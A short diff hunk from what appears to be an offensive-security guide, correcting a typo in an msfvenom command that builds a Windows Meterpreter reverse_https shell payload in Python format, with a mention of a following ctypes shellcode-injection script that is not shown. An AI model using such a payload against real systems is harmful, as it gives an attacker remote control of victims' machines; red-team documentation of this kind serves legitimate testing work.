@@ -145,7 +145,7 @@ Here's an example invocation of `msfvenom` to create a Python **meterpreter**
 reverse shell payload:
 
 ```bash
-sfvenom -p windows/x64/meterpreter/reverse_https LHOST=${LHOST} LPORT=${LPORT} -f python -o payload.py
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${LHOST} LPORT=${LPORT} -f python -o payload.py
 ```
 
 The following Python script uses `ctypes` to inject our shellcode into the
